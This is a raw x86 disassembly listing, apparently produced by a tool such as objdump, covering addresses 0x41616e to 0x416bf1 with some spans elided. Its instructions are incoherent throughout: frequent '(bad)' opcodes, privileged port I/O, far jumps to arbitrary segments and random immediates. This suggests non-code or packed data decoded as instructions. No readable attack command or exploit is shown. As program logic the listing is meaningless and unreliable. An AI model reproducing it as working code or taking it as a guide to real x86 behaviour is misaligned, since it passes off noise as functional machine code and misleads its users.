  41616e:	or     DWORD PTR [eax+0x65],eax
  416171:	push   0xfffffff9
  416173:	dec    ecx
  416174:	push   esp
  416175:	sub    ch,BYTE PTR [edi]
  416177:	inc    esp
  416178:	cdq    
  416179:	push   esi
  41617a:	mov    DWORD PTR [eax+ebx*4],eax
  41617d:	mov    dl,0xed
  41617f:	ins    BYTE PTR es:[edi],dx
  416180:	and    esp,DWORD PTR [ebx+0x7e]
  416183:	stos   BYTE PTR es:[edi],al
  416184:	not    DWORD PTR [esi]
  416186:	call   0xc565:0xcb38943b
  41618d:	imul   esi,DWORD PTR [ebx+0x532cb175],0x55e9212f
  416197:	sub    eax,0xd04df3b5
  41619c:	jb     0x4161cf
  41619e:	(bad)  
  41619f:	push   ebx
  4161a0:	inc    edx
  4161a1:	xor    al,0x99
  4161a3:	xchg   edi,eax
  4161a4:	adc    DWORD PTR [ebp-0x32],0x22
  4161a8:	imul   ebx,DWORD PTR [esp+edx*2-0x6a],0x3c
  4161ad:	enter  0x6156,0x9a
  4161b1:	aaa    
  4161b2:	mov    ss,ebx
  4161b4:	fdiv   QWORD PTR [ecx+0x74668aa]
  4161ba:	cs mov cl,0x35
  4161bd:	xchg   edx,eax
  4161be:	pop    es
  4161bf:	shld   ebp,edi,0xac
  4161c3:	data16 jns 0x4161b2
  4161c6:	mov    bh,0xbd
  4161c8:	or     eax,0x342b4be
  4161cd:	pop    esp
  4161ce:	jg     0x416203
  4161d0:	pop    ebp
  4161d1:	push   0xbc6ce440
  4161d6:	fcomp  st(6)
  4161d8:	xchg   DWORD PTR [edx-0x45dadeef],ebp
  4161de:	dec    esp
  4161df:	inc    ecx
  4161e0:	adc    al,0x46
  4161e2:	add    bh,al
  4161e4:	ss jp  0x416181
  4161e7:	ficomp DWORD PTR [edx+0x592d5479]
  4161ed:	add    DWORD PTR ds:0x6c1df6ff,esi
  4161f3:	aaa    
  4161f4:	adc    al,BYTE PTR ds:0xa905b29e
  4161fa:	cmp    BYTE PTR [edi-0x7b],0xe6
  4161fe:	lea    ebx,[eax]
  416200:	test   ch,ch
  416202:	adc    eax,esp
  416204:	out    dx,al
  416205:	(bad)  
  416206:	pop    esi
  416207:	nop
  416208:	ret    
  416209:	dec    edi
  41620a:	sbb    al,0x53
  41620c:	fist   WORD PTR [ecx+eiz*2-0x5d87ec18]
  416213:	pop    esi
  416214:	jo     0x41628a
  416216:	out    dx,al
  416217:	ficomp DWORD PTR [edx+0x1b]
  41621a:	add    DWORD PTR [eax],ecx
  41621c:	dec    ebp
  41621d:	mov    WORD PTR ds:0x6dcc4c51,ss
  416223:	dec    esi
  416224:	sbb    al,0x9f
  416226:	stc    
  416227:	mov    esp,0x99ff93de
  41622c:	mov    cs:0xa9e90c9f,eax
  416232:	ficomp WORD PTR [edi]
  416234:	int3   
	...
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi+0x5952f6de],bh
  4162a4:	neg    DWORD PTR [ebp-0x6b]
  4162a7:	out    0x0,eax
  4162a9:	add    BYTE PTR [edi],al
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    dl,dh
  4162af:	mov    ecx,0x36753671
  4162b4:	adc    dh,BYTE PTR [esi+0x44]
  4162b7:	icebp  
  4162b8:	out    dx,eax
  4162b9:	sbb    DWORD PTR [ebp+ebx*1+0x5fe5c2b8],0xe518e28b
  4162c4:	es push ebp
  4162c6:	call   DWORD PTR [edi-0x130ad0df]
  4162cc:	mov    BYTE PTR [eax-0x33],al
  4162cf:	xor    DWORD PTR [esi],0xffffff9d
  4162d2:	je     0x4162f3
  4162d4:	int3   
  4162d5:	fdivr  st(1),st
  4162d7:	cmp    edi,DWORD PTR [eax-0x219e1ad]
  4162dd:	inc    eax
  4162de:	push   ecx
  4162df:	adc    BYTE PTR [ecx],bl
  4162e1:	push   edx
  4162e2:	inc    eax
  4162e3:	or     eax,esp
  4162e5:	ficom  DWORD PTR [esi]
  4162e7:	aas    
  4162e8:	cmp    DWORD PTR gs:[ebp+0x13728766],esp
  4162ef:	dec    ecx
  4162f0:	pop    eax
  4162f1:	jl     0x4162c3
  4162f3:	retf   0xb13e
  4162f6:	enter  0xee26,0x2f
  4162fa:	ins    BYTE PTR es:[edi],dx
  4162fb:	call   0x8da41fad
  416300:	(bad)  
  416301:	aam    0xfc
  416303:	fwait
  416304:	pop    edx
  416305:	cdq    
  416306:	fsubr  DWORD PTR ds:0xc2c0a7b4
  41630c:	fld    TBYTE PTR [esi+0x78aa729b]
  416312:	dec    ebp
  416313:	mov    esp,eax
  416315:	mov    DWORD PTR [eax-0x268110be],esi
  41631b:	sub    esp,DWORD PTR [esi]
  41631d:	xchg   ecx,eax
  41631e:	lock sbb al,0xac
  416321:	retf   0xf802
  416324:	push   edi
  416325:	push   edx
  416326:	push   DWORD PTR [edi]
  416328:	popa   
  416329:	fdiv   DWORD PTR [ebp+0x4266a91b]
  41632f:	std    
  416330:	jnp    0x416324
  416332:	adc    al,0x81
  416334:	jbe    0x416354
  416336:	xchg   ebp,eax
  416337:	jb     0x416325
  416339:	dec    eax
  41633a:	repz xchg esp,eax
  41633c:	loopne 0x416398
  41633e:	sub    al,BYTE PTR [edi+0x3c00d93b]
  416344:	lods   eax,DWORD PTR ds:[esi]
  416345:	(bad)  
  416346:	(bad)  
  416347:	sbb    edi,DWORD PTR [ebp+esi*1-0x5a94938d]
  41634e:	out    0xc4,al
  416350:	add    DWORD PTR [ebp+0x1f79808f],esp
  416356:	loopne 0x416317
  416358:	loop   0x4163af
  41635a:	les    edx,FWORD PTR [ebp*1-0x40a92aaa]
  416361:	loopne 0x416367
  416363:	pop    ecx
  416364:	or     dh,dh
  416366:	rol    DWORD PTR [ebp-0x12],0x3d
  41636a:	imul   esi,edx,0x51
  41636d:	jbe    0x4163e9
  41636f:	clc    
  416370:	adc    DWORD PTR [edx-0x20],edi
  416373:	add    al,0x6f
  416375:	cmp    BYTE PTR [eax-0x7b2853bc],al
  41637b:	xchg   esi,eax
  41637c:	popa   
  41637d:	mov    bl,0x33
  41637f:	test   DWORD PTR ds:0x7a776fee,0xac0e9789
  416389:	fldcw  WORD PTR ss:[edi]
  41638c:	scas   al,BYTE PTR es:[edi]
  41638d:	shr    DWORD PTR [esp+esi*8+0x52],0xb3
  416392:	in     al,0xb7
  416394:	es repz loopne 0x416365
  416398:	or     edi,DWORD PTR [esp+ecx*1-0x4ed55461]
  41639f:	pop    edi
  4163a0:	push   edx
  4163a1:	mov    ebx,0x7c0b0cde
  4163a6:	push   ds
  4163a7:	cwde   
  4163a8:	scas   al,BYTE PTR es:[edi]
  4163a9:	mov    eax,ds:0xfdb8c810
  4163ae:	scas   al,BYTE PTR es:[edi]
  4163af:	pop    es
  4163b0:	imul   esi,DWORD PTR [esi+0x5401d0],0x0
	...
  416416:	repz inc ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp-0x4e54130d],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	js     0x41649a
  416430:	push   es
  416431:	mov    DWORD PTR [ebx],edi
  416433:	hlt    
  416434:	je     0x4163b6
  416436:	iret   
  416437:	fs jg  0x4163c4
  41643a:	push   ebx
  41643b:	or     edx,ecx
  41643d:	outs   dx,BYTE PTR ds:[esi]
  41643e:	jo     0x416455
  416440:	rcl    DWORD PTR [ebp+0x83c4807],cl
  416446:	or     al,0xc
  416448:	sub    ah,BYTE PTR [edx+eax*2+0x5f1b0a77]
  41644f:	out    0x3f,al
  416451:	arpl   WORD PTR [ecx+0x37eb2c0a],ax
  416457:	jbe    0x416442
  416459:	int    0xa4
  41645b:	scas   eax,DWORD PTR es:[edi]
  41645c:	in     eax,0xca
  41645e:	sbb    eax,0x9b489a93
  416463:	jns    0x4164c5
  416465:	in     eax,0xc6
  416467:	scas   al,BYTE PTR es:[edi]
  416468:	and    cl,BYTE PTR [esi-0x385d706e]
  41646e:	call   0x5750e1bd
  416473:	mov    esi,DWORD PTR [edx+0x3a]
  416476:	mov    ch,0x5d
  416478:	or     ah,BYTE PTR [ecx+0x28]
  41647b:	imul   ebx,DWORD PTR [ecx+0x1f010c9b],0xd7051765
  416485:	es push ebx
  416487:	push   esi
  416488:	push   edi
  416489:	(bad)  
  41648a:	out    dx,al
  41648b:	and    edx,ecx
  41648d:	sbb    BYTE PTR [ecx+0x526af212],cl
  416493:	popf   
  416494:	aaa    
  416495:	dec    edx
  416496:	adc    eax,0x279678bf
  41649b:	iret   
  41649c:	push   0x50
  41649e:	jbe    0x41645c
  4164a0:	sub    esi,DWORD PTR [ecx-0x36ca0e5]
  4164a6:	inc    edi
  4164a7:	stc    
  4164a8:	loope  0x41648e
  4164aa:	in     eax,dx
  4164ab:	and    al,0x50
  4164ad:	inc    esi
  4164ae:	add    ecx,DWORD PTR [esi+0x2e8ddb5d]
  4164b4:	xor    BYTE PTR ds:0xebb43ae3,bh
  4164ba:	js     0x4164ae
  4164bc:	mov    esp,0x6e0ff61
  4164c1:	in     eax,dx
  4164c2:	fisttp WORD PTR [ebx+eiz*8-0x79313f9b]
  4164c9:	outs   dx,DWORD PTR ds:[esi]
  4164ca:	scas   al,BYTE PTR es:[edi]
  4164cb:	jg     0x41647c
  4164cd:	bswap  eax
  4164cf:	lock xchg ebp,eax
  4164d1:	adc    BYTE PTR [edi-0xe7f7b57],bh
  4164d7:	out    dx,al
  4164d8:	and    eax,0xc3f5f812
  4164dd:	xor    DWORD PTR [edx-0x78e2cdc9],edi
  4164e3:	js     0x4164c1
  4164e5:	outs   dx,BYTE PTR ds:[esi]
  4164e6:	adc    al,0xfe
  4164e8:	push   0xffffffcb
  4164ea:	xchg   esp,eax
  4164eb:	pop    esp
  4164ec:	jp     0x416549
  4164ee:	inc    ecx
  4164ef:	xlat   BYTE PTR ds:[ebx]
  4164f0:	nop
  4164f1:	call   0x2ccb:0xff101393
  4164f8:	push   ecx
  4164f9:	in     al,dx
  4164fa:	jne    0x4164f5
  4164fc:	adc    DWORD PTR [eax+0x113ae095],ecx
  416502:	adc    DWORD PTR [edi],ebp
  416504:	cmp    BYTE PTR [ebp-0x2b9b0d85],0x12
  41650b:	(bad)  
  41650c:	js     0x4164d0
  41650e:	mov    ch,0x2c
  416510:	and    bp,WORD PTR [ebp-0x2e2a78b0]
  416517:	jmp    0x422c5f45
  41651c:	mov    ah,0x2
  41651f:	outs   dx,DWORD PTR ds:[esi]
  416520:	xchg   esi,eax
  416521:	loopne 0x4164eb
  416523:	sub    BYTE PTR [edx+0x12139ff1],dh
  416529:	mov    edi,0x737c60ca
  41652e:	push   edx
  41652f:	mov    ebp,0xf6e9b15a
  416534:	cmp    eax,0x0
	...
  416595:	add    BYTE PTR ds:0xfff32bd8,ah
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x4165d1
  4165a3:	das    
  4165a4:	adc    al,BYTE PTR [esi+0xe9a3]
  4165aa:	pop    es
  4165ab:	add    DWORD PTR [eax],eax
  4165ad:	add    BYTE PTR [ebp+0xb244023],bh
  4165b3:	sbb    BYTE PTR ds:0x36e1743c,dh
  4165b9:	mov    ch,0x74
  4165bb:	pop    es
  4165bc:	sub    al,0x2b
  4165be:	lods   eax,DWORD PTR ds:[esi]
  4165bf:	push   edi
  4165c0:	inc    ebp
  4165c1:	pop    es
  4165c2:	adc    edi,esp
  4165c4:	push   cs
  4165c5:	bound  edi,QWORD PTR [edi]
  4165c7:	xchg   ebx,eax
  4165c8:	mov    ebx,0xd05476c0
  4165cd:	xor    dh,BYTE PTR [edx+eiz*2-0x3a]
  4165d1:	test   eax,0xfc06c3fa
  4165d6:	les    eax,FWORD PTR [ebx]
  4165d8:	int    0x28
  4165da:	mov    eax,ds:0x5dbdafaa
  4165df:	ror    BYTE PTR [edi],0x28
  4165e2:	xchg   ecx,eax
  4165e3:	popa   
  4165e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165e5:	cmp    ch,BYTE PTR [esi-0x49e44333]
  4165eb:	fisttp DWORD PTR [eax-0x24]
  4165ee:	pop    eax
  4165ef:	mov    ch,0x5f
  4165f1:	fdivp  st(4),st
  4165f3:	cmp    BYTE PTR [esi-0x33],bl
  4165f6:	(bad)
  4165fa:	push   esp
  4165fb:	aam    0x50
  4165fd:	int    0x1
  4165ff:	xchg   edx,eax
  416600:	test   ebp,ebx
  416602:	sbb    al,0x1a
  416604:	fimul  WORD PTR [edx+0x2a]
  416607:	sub    al,bl
  416609:	idiv   DWORD PTR [ebx-0x5]
  41660c:	cli    
  41660d:	aad    0x32
  41660f:	and    eax,DWORD PTR [ecx]
  416611:	stos   DWORD PTR es:[edi],eax
  416612:	jle    0x416644
  416614:	push   ecx
  416615:	sbb    BYTE PTR [ecx+edx*8],ah
  416618:	push   esp
  416619:	out    dx,eax
  41661a:	jg     0x41667b
  41661c:	cld    
  41661d:	enter  0xae4c,0x61
  416621:	jbe    0x416657
  416623:	jns    0x416622
  416625:	pop    edx
  416626:	(bad)  
  416627:	and    BYTE PTR [eax],ch
  416629:	mov    ebp,DWORD PTR [ebx-0x22ea9608]
  41662f:	sbb    eax,DWORD PTR [ecx]
  416631:	stos   DWORD PTR es:[edi],eax
  416632:	popa   
  416633:	pop    edx
  416634:	loop   0x4165e9
  416636:	or     al,0xb
  416638:	sub    DWORD PTR [ebx],edi
  41663a:	int3   
  41663b:	leave  
  41663c:	cmp    al,0xbe
  41663e:	fwait
  41663f:	cmp    al,0xae
  416641:	(bad)  
  416642:	call   0x10b1f657
  416647:	daa    
  416648:	xchg   esi,eax
  416649:	cmc    
  41664a:	push   eax
  41664b:	adc    ebp,DWORD PTR ds:0x351855dd
  416651:	aad    0x28
  416653:	pop    ecx
  416654:	int3   
  416655:	in     al,dx
  416656:	mov    al,ds:0x92f1be70
  41665b:	or     edi,esp
  41665d:	push   ss
  41665e:	cs js  0x4166b8
  416661:	or     bl,BYTE PTR [ebx]
  416663:	aaa    
  416664:	ss iret 
  416666:	fadd   st,st(3)
  416668:	mov    edi,0xb7df989d
  41666d:	mov    esp,0x8ca30731
  416672:	xchg   si,ax
  416674:	dec    ebx
  416675:	imul   esi,edi,0xfffffffd
  416678:	adc    eax,0xf68e8818
  41667d:	mov    ebp,0x9ee22c69
  416682:	fcomi  st,st(0)
  416684:	jae    0x4166d0
  416686:	add    al,0x7b
  416688:	adc    al,0xac
  41668a:	scas   eax,DWORD PTR es:[edi]
  41668b:	aaa    
  41668c:	pop    ecx
  41668d:	jg     0x4166ca
  41668f:	(bad)  
  416690:	(bad)  
  416691:	jb     0x416647
  416693:	clc    
  416694:	(bad)  
  416695:	hlt    
  416696:	mov    eax,ds:0x4fabc984
  41669b:	cmp    al,0x94
  41669d:	jbe    0x416718
  41669f:	jae    0x416716
  4166a1:	pushf  
  4166a2:	test   eax,0x67b7e80b
  4166a7:	push   es
  4166a8:	lods   eax,DWORD PTR ds:[esi]
  4166a9:	stos   BYTE PTR es:[edi],al
  4166aa:	sbb    DWORD PTR [edi],esp
  4166ac:	push   es
  4166ad:	es pop eax
  4166af:	add    al,0xb4
  4166b1:	xchg   edx,eax
  4166b2:	mov    cl,0x19
  4166b4:	jecxz  0x4166b6
	...
  416716:	(bad)  
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	aaa    
  416723:	push   ds
  416724:	mov    dl,0xd8
  416726:	stos   BYTE PTR es:[edi],al
  416727:	jmp    0x0:0x1070000
  41672e:	cli    
  41672f:	mov    ch,cl
  416731:	xlat   BYTE PTR ds:[ebx]
  416732:	das    
  416733:	repnz or edi,DWORD PTR [ecx-0x2239714b]
  41673a:	pop    ecx
  41673b:	mov    DWORD PTR [eax-0x16125fcb],0x312a538e
  416745:	inc    ecx
  416746:	pop    esi
  416747:	cmp    BYTE PTR ds:[eax-0x76],ch
  41674b:	push   esi
  41674c:	mov    ecx,DWORD PTR [esi-0x1e19a23c]
  416752:	sar    eax,0xd7
  416755:	rcl    DWORD PTR [esi],0xd7
  416758:	cmp    eax,0xe7cc548
  41675d:	test   DWORD PTR [ebx+0x53],0xba62e7e2
  416764:	loope  0x4167e0
  416766:	adc    BYTE PTR [ecx+ecx*4],al
  416769:	mov    esp,0x8d93fdeb
  41676e:	popf   
  41676f:	pop    es
  416770:	hlt    
  416771:	ret    0xe649
  416774:	retf   0xc745
  416777:	xchg   DWORD PTR [ecx],esi
  416779:	mov    ds:0x1e7ecbb0,al
  41677e:	xchg   esi,eax
  41677f:	mov    ecx,0xd3749c5e
  416784:	mov    BYTE PTR [edx+0x3bdf5f84],ah
  41678a:	loopne 0x41678f
  41678c:	cmp    edx,DWORD PTR [eax-0x6f]
  41678f:	mov    fs,WORD PTR [edi-0x37]
  416792:	adc    BYTE PTR [edx],0x21
  416795:	dec    DWORD PTR [esi-0x27]
  416798:	or     DWORD PTR [ebp+0x3c22f30a],0xd286f44a
  4167a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167a3:	clc    
  4167a4:	shl    BYTE PTR [eax],1
  4167a6:	sbb    al,0x60
  4167a8:	jb     0x416741
  4167aa:	fs jg  0x4167df
  4167ad:	mov    ecx,0x9e088998
  4167b2:	pop    edx
  4167b3:	sbb    ah,BYTE PTR [edx+0x2173ee19]
  4167b9:	mov    esi,0xd3766727
  4167be:	(bad)  
  4167bf:	cwde   
  4167c0:	mov    bl,0xd5
  4167c2:	sbb    BYTE PTR ds:0xf756e747,0x53
  4167c9:	(bad)
  4167cd:	pop    ebx
  4167ce:	cmc    
  4167cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167d0:	aad    0xdf
  4167d2:	shl    BYTE PTR [edi-0x4355dc16],0x0
  4167d9:	adc    DWORD PTR [ecx],edi
  4167db:	punpckhdq mm4,QWORD PTR [edi]
  4167de:	inc    edx
  4167df:	outs   dx,DWORD PTR ds:[esi]
  4167e0:	push   ecx
  4167e1:	arpl   WORD PTR [edx],bx
  4167e3:	stc    
  4167e4:	sub    eax,0x8481823b
  4167e9:	loopne 0x4167b6
  4167eb:	std    
  4167ec:	je     0x416784
  4167ee:	sub    esi,edx
  4167f0:	adc    ebx,DWORD PTR [ebp+0x5d42de7b]
  4167f6:	add    eax,0x538668b
  4167fb:	xchg   ebx,eax
  4167fc:	xlat   BYTE PTR ds:[ebx]
  4167fd:	(bad)  
  4167ff:	xor    DWORD PTR [ecx+0x12],edx
  416802:	mov    cl,0x4f
  416804:	les    esi,FWORD PTR [ecx+0x6b]
  416807:	and    DWORD PTR [eax],ebp
  416809:	mov    ds,WORD PTR [ecx+0x5dd319ca]
  41680f:	ficomp DWORD PTR [esi+0x57]
  416812:	sub    BYTE PTR [eax-0x12],al
  416815:	inc    edx
  416816:	cmp    al,0x99
  416818:	mov    ch,0xa1
  41681a:	xchg   BYTE PTR [eax],dl
  41681c:	or     BYTE PTR [esi],0x45
  41681f:	push   cs
  416820:	and    eax,0x455669ef
  416825:	jb     0x416870
  416827:	cmp    dh,BYTE PTR [esp+ecx*2]
  41682a:	rcl    DWORD PTR [edi+0x27eee4cd],0xf5
  416831:	mov    ecx,0x8832f3
	...
  416896:	shr    DWORD PTR [edi-0x4810cfa],1
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	repnz xchg esp,eax
  4168a3:	xchg   ebx,eax
  4168a4:	fwait
  4168a5:	mov    ds:0xebb1,al
  4168aa:	pop    es
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    cl,dl
  4168af:	cmp    dh,dl
  4168b1:	inc    esi
  4168b2:	imul   esp,DWORD PTR [esi+0x2ca1defa],0xa76afe4
  4168bc:	test   eax,0xa2d2f618
  4168c1:	data16 jo 0x4168be
  4168c4:	jp     0x416854
  4168c6:	xchg   edi,eax
  4168c7:	adc    ch,BYTE PTR [eax+0x180c3f85]
  4168cd:	sbb    al,0x85
  4168cf:	pop    eax
  4168d0:	mov    eax,ds:0x591f81a1
  4168d5:	mov    ecx,0x4b5c7e39
  4168da:	jns    0x41692e
  4168dc:	in     al,dx
  4168dd:	inc    esp
  4168de:	(bad)  
  4168df:	cld    
  4168e0:	test   DWORD PTR ds:0x9a039f5,edi
  4168e6:	ss pop edi
  4168e8:	je     0x4168ca
  4168ea:	xor    BYTE PTR ss:[ecx-0x2b],bh
  4168ee:	(bad)  
  4168ef:	retf   0xcd7a
  4168f2:	jbe    0x4168ac
  4168f4:	xor    dl,dh
  4168f6:	dec    ebp
  4168f7:	test   eax,0x844bdf81
  4168fc:	out    dx,al
  4168fd:	and    bl,BYTE PTR [edx+0x76]
  416900:	fmul   QWORD PTR [edi+0x29ca8a7a]
  416906:	sbb    DWORD PTR [ebp+0xf],0x7e
  41690a:	pop    eax
  41690b:	and    eax,0x688a1dbe
  416910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416911:	ret    0x26ce
  416914:	fst    QWORD PTR [ebx-0x39]
  416917:	popa   
  416918:	popf   
  416919:	ret    0xdf0d
  41691c:	out    dx,eax
  41691d:	(bad)  
  41691e:	aad    0xbd
  416920:	ror    BYTE PTR [edi],0xa0
  416923:	ins    DWORD PTR es:[edi],dx
  416924:	int    0x86
  416926:	pop    esi
  416927:	sbb    ecx,DWORD PTR [edi-0x4f90753e]
  41692d:	rcl    al,0x43
  416930:	in     eax,0x8a
  416932:	push   ecx
  416933:	mov    cl,al
  416935:	push   0xffffffc6
  416937:	idiv   BYTE PTR [ecx-0x1e7e3ff3]
  41693d:	mov    eax,ds:0xf431127a
  416942:	lea    edx,[ebx+0x2b]
  416945:	test   BYTE PTR [edi],0x70
  416948:	dec    ecx
  416949:	mov    BYTE PTR [ecx+0x6],ah
  41694c:	cmp    eax,0x1de81a6c
  416951:	fstp   DWORD PTR [ebx+0x3e]
  416954:	or     DWORD PTR [ebx-0x1e61a69c],ebp
  41695a:	loope  0x41694c
  41695c:	mov    ds:0x43ae5036,eax
  416961:	rcr    BYTE PTR [edi],0xd5
  416964:	fist   DWORD PTR [ebx]
  416966:	xchg   ecx,eax
  416967:	(bad)  
  416968:	and    edx,edx
  41696a:	adc    ah,dl
  41696c:	dec    eax
  41696d:	test   BYTE PTR [edi*1+0x6bc057ef],bl
  416974:	inc    ebx
  416975:	cmp    ebx,DWORD PTR [esi]
  416977:	mov    dh,BYTE PTR [eax]
  416979:	push   es
  41697a:	pop    eax
  41697b:	call   0xc1b4:0x157978f
  416982:	imul   edi,ebp,0xffffffaa
  416985:	mov    BYTE PTR [ebp+edi*2+0x203f4260],dl
  41698c:	jecxz  0x416958
  41698e:	mov    ds:0xf93e0569,eax
  416993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416994:	xlat   BYTE PTR ds:[ebx]
  416995:	test   eax,0x57cf770d
  41699a:	pop    es
  41699b:	xchg   ecx,eax
  41699c:	adc    eax,0x33143a94
  4169a1:	sub    BYTE PTR cs:[bx+di-0x636],ch
  4169a7:	inc    ebx
  4169a8:	fild   QWORD PTR [edx-0x1f9164ef]
  4169ae:	xor    al,0x2f
  4169b0:	dec    esi
  4169b1:	cmc    
  4169b2:	popf   
  4169b3:	cmc    
  4169b4:	jge    0x4169b6
	...
  416a16:	retf   
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	icebp  
  416a23:	ins    DWORD PTR es:[edi],dx
  416a24:	icebp  
  416a25:	xchg   ebp,eax
  416a26:	mov    eax,0x70000ec
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [edi+edx*1+0x7f],bl
  416a31:	leave  
  416a32:	loopne 0x416a28
  416a34:	ss push es
  416a36:	fwait
  416a37:	push   eax
  416a38:	xchg   edx,eax
  416a39:	xchg   edx,eax
  416a3a:	inc    DWORD PTR [edx-0xb5786d8]
  416a40:	inc    edx
  416a41:	sub    al,0x8d
  416a43:	(bad)  
  416a44:	ficom  WORD PTR [edi+0x1c]
  416a47:	mov    BYTE PTR [ebp-0x36],dh
  416a4a:	(bad)  
  416a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a4c:	lock pop esp
  416a4e:	ss aam 0x10
  416a51:	pop    ss
  416a52:	pusha  
  416a53:	test   eax,0x150886bd
  416a58:	pop    ds
  416a59:	xchg   ebp,eax
  416a5a:	mov    ecx,0x10d9c01f
  416a5f:	adc    dl,BYTE PTR [edx+0x5b]
  416a62:	mov    al,0x63
  416a64:	mov    ebx,0x449af0a6
  416a69:	sti    
  416a6a:	sbb    al,0x6b
  416a6c:	xchg   esi,edi
  416a6e:	mov    eax,ds:0x9bbed0d9
  416a73:	fucom  st(2)
  416a75:	pop    ecx
  416a76:	pop    esp
  416a77:	push   ecx
  416a78:	lods   al,BYTE PTR ds:[esi]
  416a79:	and    BYTE PTR [ebx-0x12],ah
  416a7c:	outs   dx,DWORD PTR ds:[esi]
  416a7d:	retf   
  416a7e:	mov    ds:0x40b55b00,al
  416a83:	xor    ch,ah
  416a85:	jb     0x416a57
  416a87:	push   edi
  416a88:	aaa    
  416a89:	fimul  DWORD PTR [edx]
  416a8b:	pop    esp
  416a8c:	pop    esp
  416a8d:	shr    DWORD PTR [ecx],0x8d
  416a90:	out    dx,eax
  416a91:	inc    esp
  416a92:	mov    al,ds:0x8ce3ed13
  416a97:	jae    0x416a7a
  416a99:	lods   al,BYTE PTR ds:[esi]
  416a9a:	out    0xde,al
  416a9c:	xor    BYTE PTR [ebx-0x51374149],bl
  416aa2:	gs mov dh,0x3a
  416aa5:	popa   
  416aa6:	mov    eax,ds:0xc15ae3bb
  416aab:	push   ds
  416aac:	shl    BYTE PTR ds:0x20497073,cl
  416ab2:	data16 lahf 
  416ab4:	mov    edx,0x9a8573ca
  416ab9:	stc    
  416aba:	push   esp
  416abb:	repz pop ebx
  416abd:	jmp    0x400c:0x6b84aa94
  416ac4:	jb     0x416b3d
  416ac6:	add    bh,BYTE PTR [eax+0xb]
  416ac9:	jmp    0x416aef
  416acb:	mov    al,ds:0xb4828269
  416ad0:	jg     0x416af0
  416ad2:	out    dx,eax
  416ad3:	pop    ebp
  416ad4:	in     al,dx
  416ad5:	lahf   
  416ad6:	es fmul DWORD PTR gs:[ebx]
  416ada:	dec    edi
  416adb:	scas   al,BYTE PTR es:[edi]
  416adc:	xchg   esp,eax
  416add:	xchg   esp,eax
  416ade:	mov    ecx,0xad082752
  416ae3:	sub    eax,0xb7765076
  416ae8:	popa   
  416ae9:	and    cl,BYTE PTR [ebp-0x20157850]
  416aef:	xchg   esi,eax
  416af0:	mov    ch,0xdc
  416af2:	jecxz  0x416b46
  416af4:	je     0x416b55
  416af6:	out    0x5a,eax
  416af8:	out    0xf8,al
  416afa:	cmc    
  416afb:	adc    al,0x5b
  416afd:	jge    0x416aa0
  416aff:	fisttp QWORD PTR [ecx-0x5142d1d3]
  416b05:	mov    bl,0xe3
  416b07:	cmp    ah,BYTE PTR [ebx+0x5f18afed]
  416b0d:	cmp    DWORD PTR [eax+0x75],esi
  416b10:	push   ds
  416b11:	jnp    0x416b38
  416b13:	sar    BYTE PTR [edi],cl
  416b15:	cwde   
  416b16:	pop    ds
  416b17:	xchg   ebp,eax
  416b18:	jmp    0x416ac7
  416b1a:	pop    edx
  416b1b:	cmp    DWORD PTR [esi+0x54],eax
  416b1e:	std    
  416b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b20:	sbb    ebx,edx
  416b22:	pop    es
  416b23:	aaa    
  416b24:	repz xlat BYTE PTR ds:[ebx]
  416b26:	mov    cl,dl
  416b28:	mov    fs,WORD PTR [edi]
  416b2a:	cmc    
  416b2b:	push   es
  416b2c:	das    
  416b2d:	jg     0x416b76
  416b2f:	push   es
  416b30:	test   BYTE PTR [esi-0x53],0xed
  416b34:	fadd   QWORD PTR [eax]
	...
  416b96:	jecxz  0x416bfd
  416b98:	push   cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0x4fa56b6b
  416ba3:	out    0x48,al
  416ba5:	pop    edi
  416ba6:	mov    edi,0x70000ed
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    BYTE PTR [ecx],al
  416baf:	sbb    al,0x77
  416bb1:	push   ss
  416bb2:	js     0x416c06
  416bb4:	pop    ss
  416bb5:	jb     0x416c23
  416bb7:	or     al,0x47
  416bb9:	div    BYTE PTR ds:0x72a3e6d6
  416bbf:	pop    edi
  416bc0:	cli    
  416bc1:	mov    ebx,0xf4951594
  416bc6:	adc    dx,WORD PTR fs:[ecx]
  416bca:	aas    
  416bcb:	lds    ecx,FWORD PTR [eax]
  416bcd:	adc    edi,DWORD PTR [ebx-0x10]
  416bd0:	sbb    al,0x14
  416bd2:	dec    esi
  416bd3:	aaa    
  416bd4:	adc    eax,0x7c713c34
  416bd9:	push   ecx
  416bda:	arpl   WORD PTR [ecx+0x1d0e4bad],si
  416be0:	and    al,0x76
  416be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be3:	loop   0x416b85
  416be5:	xchg   esp,eax
  416be6:	jb     0x416c4f
  416be8:	mov    dl,0x55
  416bea:	ins    DWORD PTR es:[edi],dx
  416beb:	icebp  
  416bec:	leave  
  416bed:	jl     0x416c1b
  416bef:	push   edi
  416bf0:	lods   al,BYTE PTR ds:[esi]
  416bf1:	loopne 0x416bb1
